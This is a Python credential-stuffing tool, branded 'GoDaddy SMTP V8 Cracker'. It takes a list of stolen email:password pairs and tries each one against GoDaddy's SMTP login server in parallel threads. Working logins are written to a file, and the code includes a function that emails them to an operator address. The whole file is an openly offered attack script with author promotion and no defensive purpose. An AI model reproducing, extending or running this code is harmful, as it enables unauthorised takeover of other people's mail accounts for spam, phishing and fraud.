import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import Fore, Style, Back, init
from concurrent.futures import ThreadPoolExecutor
import threading
import os
import time
import webbrowser

# Initialize colorama
init(autoreset=True)

# SMTP Settings
SMTP_HOST = "smtpout.secureserver.net"
SMTP_PORT = 587
SMTP_NAME = "Godaddy"

class SMTPTracker:
    def __init__(self):
        self.hits = 0  # Valid SMTPs
        self.bad = 0   # Invalid SMTPs
        self.start = time.time()

    def update_title(self):
        while True:
            elapsed = time.strftime("%H:%M:%S", time.gmtime(time.time() - self.start))
            os.system(
                f"title {SMTP_NAME} SMTP V8 Cracker - Script Coder: @xghost123 x wstore.live ^| - Valid: {self.hits} ^| Invalid: {self.bad} ^| Time elapsed: {elapsed}"
                if os.name == 'nt' else ""
            )
            time.sleep(1)

    def increment_hits(self):
        self.hits += 1

    def increment_bad(self):
        self.bad += 1

# Banner
print(f"""
{Fore.WHITE + Style.BRIGHT}
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                                                                      ║
    ║   ██████╗  ██████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗               ║
    ║  ██╔════╝ ██╔═══██╗██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝               ║
    ║  ██║  ███╗██║   ██║██║  ██║███████║██║  ██║ ╚████╔╝                ║
    ║  ██║   ██║██║   ██║██║  ██║██╔══██║██║  ██║  ╚██╔╝                 ║
    ║  ╚██████╔╝╚██████╔╝██████╔╝██║  ██║██████╔╝   ██║                  ║
    ║   ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝    ╚═╝                  ║
    ║                                                                      ║
    ║           ⚡ GODADDY SMTP V8 CRACKER - PREMIUM EDITION ⚡            ║
    ║                                                                      ║
    ║  👨‍💻 Developer: @xghost123                                          ║
    ║  🌐 Website: wstore.live                                             ║
    ║  📱 Telegram: @xghost123                                             ║
    ║                                                                      ║
    ║  ┌──────────────────────────────────────────────────────────────┐   ║
    ║  │  🔥 PREMIUM SMTP CHECKER  │  ⚡ HIGH SPEED  │  🎯 ACCURATE  │   ║
    ║  └──────────────────────────────────────────────────────────────┘   ║
    ║                                                                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Back.GREEN + Fore.LIGHTWHITE_EX} {SMTP_NAME} SMTP V8 Cracker - Script Coder: @xghost123 x wstore.live {Style.RESET_ALL}
""")

# File paths
COMBO_FILE = input("Enter the path to the combo file: ").strip()
RESULT_FILE = f"{SMTP_NAME}_SMTP.txt"

# Validate combo file
if not os.path.exists(COMBO_FILE):
    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File not found: {COMBO_FILE}")
    exit(1)

def check_smtp_combo(email, password):
    try:
        server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10)
        server.ehlo()
        server.starttls()
        server.login(email, password)
        server.quit()
        return True, None
    except smtplib.SMTPAuthenticationError:
        return False, "Authentication failed."
    except Exception as e:
        return False, str(e)

def send_notification(recipient_email, smtp_details):
    smtp_host, smtp_port, email, password = smtp_details
    try:
        server = smtplib.SMTP(smtp_host, smtp_port, timeout=10)
        server.ehlo()
        server.starttls()
        server.login(email, password)

        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = recipient_email
        msg["Subject"] = "Valid {SMTP_NAME} SMTP Found"

        message_text = f"""
        <html>
        <body>
            <p><b>⚡️ xghost123 {SMTP_NAME} SMTP V8 ⚡️</b></p>
            <p><b>☃ SMTP Host:</b> {smtp_host}</p>
            <p><b>☃️ Port:</b> {smtp_port}</p>
            <p><b>☃ Email:</b> {email}</p>
            <p><b>☃️ Password:</b> {password}</p>
            <b>✅ Creator:</b> wstore.live & @xghost123
        </body>
        </html>
        """
        msg.attach(MIMEText(message_text, "html"))
        server.sendmail(email, recipient_email, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"{Fore.YELLOW}[WARNING]{Style.RESET_ALL} Notification failed for {email}: {e}")

def process_combo(combo, recipient_email, valid_smtps, smtp_tracker):
    try:
        if ":" not in combo:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Invalid combo format: {combo}")
            smtp_tracker.increment_bad()
            return

        email, password = combo.split(":", 1)
        success, error = check_smtp_combo(email, password)
        if success:
            print(
                f"{Fore.WHITE + Style.BRIGHT}\n[{Fore.CYAN + Style.BRIGHT}LOOKING ✔ {Fore.WHITE}]{Style.RESET_ALL} "
                f"{Fore.WHITE + Style.BRIGHT}=={Style.RESET_ALL} {Fore.GREEN}{SMTP_NAME} SMTP{Style.RESET_ALL} "
                f"{Fore.WHITE + Style.BRIGHT}==>{Style.RESET_ALL} {Fore.GREEN + Style.BRIGHT}{email}:{password}"
            )
            valid_smtps.append(f"{SMTP_HOST}|{SMTP_PORT}|{email}|{password}")
            with open(RESULT_FILE, "a", encoding="utf-8") as file:
                file.write(f"{SMTP_HOST}|{SMTP_PORT}|{email}|{password}\n")
            smtp_tracker.increment_hits()
        else:
            print(
                f"{Fore.WHITE + Style.BRIGHT}\n[{Fore.CYAN + Style.BRIGHT}LOOKING ✘ {Fore.WHITE}]{Style.RESET_ALL} "
                f"{Fore.WHITE + Style.BRIGHT}=={Style.RESET_ALL} {Fore.RED}{SMTP_NAME} SMTP{Style.RESET_ALL} "
                f"{Fore.WHITE + Style.BRIGHT}==>{Style.RESET_ALL} {Fore.RED}{email}:{password}"
            )
            smtp_tracker.increment_bad()
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Unexpected error for combo {combo}: {e}")

if __name__ == "__main__":
    smtp_tracker = SMTPTracker()
    threading.Thread(target=smtp_tracker.update_title, daemon=True).start()

    recipient_email = input("Enter the email to receive SMTP notifications: ").strip()

    with open(COMBO_FILE, "r", encoding="utf-8") as file:
        combos = [line.strip() for line in file if line.strip()]

    valid_smtps = []

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(process_combo, combo, recipient_email, valid_smtps, smtp_tracker) for combo in combos]

    print(f"\n{Fore.LIGHTGREEN_EX + Style.BRIGHT}Thank you for using our script! {Fore.LIGHTWHITE_EX}For all updates, Join/Visit Our Channels: {Fore.LIGHTCYAN_EX}wstore.live")
    time.sleep(3)
    webbrowser.open("https://wstore.live")